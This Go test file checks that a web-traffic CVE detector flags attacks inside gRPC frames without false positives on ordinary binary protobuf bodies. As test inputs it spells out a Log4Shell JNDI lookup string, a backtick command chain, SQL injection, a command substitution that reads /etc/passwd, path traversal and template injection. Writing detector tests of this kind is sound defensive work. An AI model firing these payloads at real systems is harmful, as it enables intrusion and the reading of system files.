package cve

import (
	"encoding/binary"
	"fmt"
	"testing"
)

/**
 * grpcFrame 按 gRPC-over-HTTP2 帧格式包裹消息体：
 * 1 字节压缩标志 + 4 字节大端长度 + 消息体。
 * 本包测试故意不引入 grpc 依赖，帧布局与 internal/proxy/zz_grpc_probe_test.go 一致。
 */
func grpcFrame(msg []byte) []byte {
	out := make([]byte, 5+len(msg))
	copy(out[5:], msg)
	binary.BigEndian.PutUint32(out[1:5], uint32(len(msg)))
	return out
}

/**
 * denseBinFill 生成 0x81–0xFF 的高字节填充（纯无效 UTF-8），
 * 提供超出 cveBodyBytesMostlyText 90% 可打印阈值的真实 protobuf 形状。
 */
func denseBinFill(n int) string {
	f := make([]byte, n)
	for i := range f {
		f[i] = 0x81 + byte(i%0x7F)
	}
	return string(f)
}

/**
 * TestGRPCPayloadCleanProtoNoFalsePositive 断言正常 gRPC protobuf 消息
 * （200B/300B/20KB 高字节 body + 帧头）在 CVE 引擎下零误报。
 * CVE 侧没有二进制目标抑制器，正常无 CVE 字节指示的帧依赖快筛放行，
 * 本测试确保该路径对 grpc 帧成立。
 */
func TestGRPCPayloadCleanProtoNoFalsePositive(t *testing.T) {
	cases := []struct {
		name  string
		sizes []int
		ct    string
	}{
		{"grpc", []int{200, 300, 20480}, "application/grpc"},
		{"grpc_plus_proto", []int{200, 300, 20480}, "application/grpc+proto"},
	}
	d := NewCVEDetector()
	for _, tc := range cases {
		for _, size := range tc.sizes {
			t.Run(fmt.Sprintf("%s_%d", tc.name, size), func(t *testing.T) {
				body := grpcFrame([]byte(denseBinFill(size)))
				req := BuildCVERequest("/svc.v1.API/Send", "", map[string]string{"host": "svc.example.internal", "content-type": tc.ct}, body, tc.ct)
				if matches := d.Detect(req); len(matches) > 0 {
					t.Fatalf("normal gRPC frame false positive: cve=%s pattern=%s", matches[0].CVEID, matches[0].Pattern)
				}
			})
		}
	}
}

/**
 * TestGRPCPayloadCVEIndicatorsDetected 断言 CVE 引擎在 gRPC 帧中的检出行为：
 * JNDI/Log4Shell（含 20KB 帧尾）与反引号命令链检出；SQLi/命令替换/路径穿越/
 * 模板注入与 CVE 规则库无交集，属预期无检出（与 text/plain 基线一致）。
 */
func TestGRPCPayloadCVEIndicatorsDetected(t *testing.T) {
	d := NewCVEDetector()
	cases := []struct {
		name    string
		payload string
		ct      string
		wantCVE string
	}{
		{
			name:    "log4shell_small",
			payload: "${jndi:ldap://169.254.169.254/a}",
			ct:      "application/grpc",
			wantCVE: "CVE-2021-44228",
		},
		{
			name:    "log4shell_20k_tail",
			payload: denseBinFill(20480-len("${jndi:ldap://169.254.169.254/a}")) + "${jndi:ldap://169.254.169.254/a}",
			ct:      "application/grpc+proto",
			wantCVE: "CVE-2021-44228",
		},
		{
			name:    "backtick_command",
			payload: "x=`;whoami",
			ct:      "application/grpc",
			wantCVE: "CVE-2019-NODE-CMD",
		},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			body := grpcFrame([]byte(tc.payload))
			req := BuildCVERequest("/svc.v1.API/Log", "", map[string]string{"host": "x", "content-type": tc.ct}, body, tc.ct)
			matches := d.Detect(req)
			found := false
			for _, m := range matches {
				if m.CVEID == tc.wantCVE {
					found = true
					break
				}
			}
			if !found {
				t.Fatalf("expected %s in gRPC frame, got matches=%v", tc.wantCVE, cvEIDs(matches))
			}
			t.Logf("case %s -> %s", tc.name, tc.wantCVE)
		})
	}
}

/**
 * TestGRPCPayloadCVEOutOfScopeIndicatorsMatchBaseline 记录 CVE 检测范围：
 * SQLi/命令替换/路径穿越/模板注入不属于 CVE 规则库，gRPC 帧与 text/plain
 * 基线一致地无检出；若未来 CVE 规则覆盖这些类别，本测试会提示重估矩阵。
 */
func TestGRPCPayloadCVEOutOfScopeIndicatorsMatchBaseline(t *testing.T) {
	d := NewCVEDetector()
	payloads := []string{
		"1' OR '1'='1",
		"x=$(cat /etc/passwd)",
		"../../etc/passwd",
		"{{7*7}}",
	}
	for _, payload := range payloads {
		t.Run(payload, func(t *testing.T) {
			for _, ct := range []string{"text/plain", "application/grpc", "application/grpc+json"} {
				body := []byte(payload)
				if ct != "text/plain" {
					body = grpcFrame([]byte(payload))
				}
				req := BuildCVERequest("/svc.v1.API/Exec", "", map[string]string{"host": "x", "content-type": ct}, body, ct)
				if matches := d.Detect(req); len(matches) > 0 {
					t.Fatalf("payload %q ct=%s unexpectedly matched CVE rules: %v", payload, ct, cvEIDs(matches))
				}
			}
		})
	}
}

/**
 * TestGRPCPayloadGrpcJSONCVEIndicatorsMatchPlainJSON 断言 grpc+json 帧与
 * application/json 对 CVE 指示器（Log4Shell）的检出等价。
 */
func TestGRPCPayloadGrpcJSONCVEIndicatorsMatchPlainJSON(t *testing.T) {
	d := NewCVEDetector()
	log4 := `${"user":"a","q":"` + "${jndi:ldap://169.254.169.254/a}" + `"}`
	grpcReq := BuildCVERequest("/svc.v1.API/Log", "", map[string]string{"host": "x", "content-type": "application/grpc+json"}, grpcFrame([]byte(log4)), "application/grpc+json")
	plainReq := BuildCVERequest("/svc.v1.API/Log", "", map[string]string{"host": "x", "content-type": "application/json"}, []byte(log4), "application/json")
	grpcMatches := d.Detect(grpcReq)
	plainMatches := d.Detect(plainReq)
	grpcFound, plainFound := false, false
	for _, m := range grpcMatches {
		if m.CVEID == "CVE-2021-44228" {
			grpcFound = true
		}
	}
	for _, m := range plainMatches {
		if m.CVEID == "CVE-2021-44228" {
			plainFound = true
		}
	}
	if grpcFound != plainFound {
		t.Fatalf("grpc+json Log4Shell detection mismatch: grpc=%v plain=%v", grpcFound, plainFound)
	}
}

/**
 * cvEIDs 将匹配列表压缩为 CVE 编号切片，供失败日志打印。
 */
func cvEIDs(matches []CVEMatch) []string {
	ids := make([]string, 0, len(matches))
	for _, m := range matches {
		ids = append(ids, m.CVEID)
	}
	return ids
}
